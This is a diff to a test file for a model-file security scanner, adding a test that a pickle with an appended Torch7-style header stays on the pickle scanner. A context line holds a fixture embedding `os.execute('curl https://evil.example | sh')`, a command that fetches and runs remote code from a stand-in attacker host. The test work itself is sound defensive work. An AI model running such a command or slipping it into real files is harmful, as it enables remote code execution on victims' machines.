@@ -421,6 +421,16 @@ def test_get_scanner_for_path_keeps_torch_marker_pickle_on_pickle_scanner(tmp_pa
     _assert_scanner_for_path(model_path, "pickle")
 
 
+def test_get_scanner_for_path_keeps_pickle_with_appended_ascii_torch7_header_on_pickle_scanner(tmp_path: Path) -> None:
+    model_path = tmp_path / "appended-header.pt"
+    model_path.write_bytes(
+        pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+        + b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+    )
+
+    _assert_scanner_for_path(model_path, "pickle")
+
+
 def test_get_scanner_for_path_routes_marker_form_torch7_pt_to_torch7(tmp_path: Path) -> None:
     model_path = tmp_path / "marker-checkpoint.pt"
     model_path.write_bytes(b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example | sh')\n")
